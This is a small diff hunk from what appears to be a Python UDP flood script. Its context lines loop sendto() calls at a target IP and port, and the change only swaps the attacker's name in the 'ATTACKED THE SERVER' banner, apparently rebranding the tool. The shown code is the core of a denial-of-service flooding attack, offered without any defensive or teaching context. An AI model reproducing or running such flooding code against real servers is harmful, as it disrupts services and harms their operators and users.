@@ -24,7 +24,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Xs XinZu ATTACKED THE SERVER")
+			print(i +" DerZ ATTACKED THE SERVER")
 		except:
 			print("[!] ERROR SERVER TIME OUT")
 
